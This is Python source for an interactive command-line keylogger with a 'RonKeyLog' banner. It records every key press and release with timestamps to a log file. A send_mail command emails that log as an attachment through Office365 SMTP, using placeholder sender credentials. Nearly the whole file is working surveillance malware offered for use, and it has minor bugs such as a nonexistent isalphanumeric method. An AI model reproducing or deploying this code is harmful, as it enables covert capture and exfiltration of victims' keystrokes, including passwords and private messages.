import cmd
import rich
from rich.progress import track
import prompt_toolkit.shortcuts as pt
import time
from datetime import datetime
import json
import os
import random

import pynput.keyboard as keyboard
import logging
import win32gui, win32con

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

class MyPrompt(cmd.Cmd):
    
    prompt = "[KeyLog] > "

    client = {"mail": ""}
    files = {"log": "log.txt", "data": "data.txt"}

    def do_config(self, command):
        "Configure settings : client -> mail ; file -> log, data"
        if "client" in command:
            try:
                command = command.split()[1]
                if "mail" in command:
                    self.client["mail"] = pt.prompt("Enter your mail : ")
            except:
                print(self.client["mail"])
        
        elif "file" in command:
            try:
                command = command.split()[1]
                if "log" in command:
                    self.files["log"] = pt.prompt("Enter log file : ")
                elif "data" in command:
                    self.files["data"] = pt.prompt("Enter data file : ")
            except:
                print(f"Actually data file : {self.log['file']}")
        
        else:
            print()
    
    def do_update(self, mode):
        with open(self.files["data"], "r") as file:
            line = file.readlines()[0]
            line = line.replace("'", '"')
            data = json.loads(line)
            self.client["mail"] = data["mail"]
            self.files["log"] = data["log"]
            self.files["data"] = data["data"]
            
    def do_save(self, none):
        "Save settings : To file"
        with open(self.files["data"], "w") as file:
            infos = dict(**self.client, **self.files)
            file.write(str(infos))
        for i in track(range(100), description='[green]Processing data'):
            time.sleep(0.02)

    def do_use(self, mode):
        "Use keylogger"
        loggingkey = []

        def my_on_press(key):
            isotime = datetime.now().isoformat()
            try:
                if key.char == ("'"):
                    text = isotime +  " - Press : " + str(key.char).replace("'", "!//APOS//!") + "\n"
                elif key.char.isalphanumeric():
                    text = f"{isotime} - Press : {key.char}\n"
            except:
                text = f"{isotime} - Press : {key}\n"
            loggingkey.append(text)
            print(text)

            write_key(self, text)
            
        def my_on_release(key):

            isotime = datetime.now().isoformat()
            try:
                if key.char == ("'"):
                    text = isotime +  " - Release : " + str(key.char).replace("'", "!//APOS//!") + "\n"
                elif key.char.isalphanumeric():
                    text = f"{isotime} - Release : {key.char}\n"
            except AttributeError:
                text = f"{isotime} - Release : {key}\n"
            loggingkey.append(text)
            print(text)

            write_key(self, text)

            if key == keyboard.Key.esc:
                return False
            
        def write_key(self, keys):
            with open(self.files["log"], "a")as logfile:
                for key in keys:
                    logfile.write(key)
        try:
            with keyboard.Listener(on_press=my_on_press, on_release=my_on_release) as listener:
                listener.join()
        except KeyboardInterrupt:
            pass

    def do_send_mail(self, none):
        filename = self.files["log"]
        sourcepath = os.path.dirname(os.path.abspath(filename)) + "\\" + filename

        msg = MIMEMultipart()
        msg['From'] = 'your email adress'
        print(self.client["mail"])
        msg['To'] = self.client["mail"]
        msg['Subject'] = 'Python KeyLogger'
        body = 'File.s in attachment.s'
        msg.attach(MIMEText(body, 'plain'))

        attachment = open(sourcepath, 'rb')
        part = MIMEBase('application', "octet-stream")
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(part)

        server = smtplib.SMTP('smtp.office365.com', 587)
        server.ehlo()
        server.starttls()
        server.login('your hotmail adress', 'your password')
        server.send_message(msg)
        server.quit()

        for i in track(range(100), description="[green] Sending Mail"):
            time.sleep(random.uniform(0.01, 0.1))

    def do_exit(self, arg):
        print("Goodbye !!")
        exit()
        return True

    def do_reset(self, none):
        open(self.files["log"], 'w').close()


if __name__ == "__main__":
    app = MyPrompt()
    app.intro = """    __________               ____  __.            .____                  
    \______   \ ____   ____ |    |/ _|____ ___.__.|    |    ____   ____  
     |       _//  _ \ /    \|      <_/ __ <   |  ||    |   /  _ \ / ___\ 
     |    |   (  <_> )   |  \    |  \  ___/\___  ||    |__(  <_> ) /_/  >
     |____|_  /\____/|___|  /____|__ \___  > ____||_______ \____/\___  / 
            \/            \/        \/   \/\/             \/    /_____/  """
    app.cmdloop()
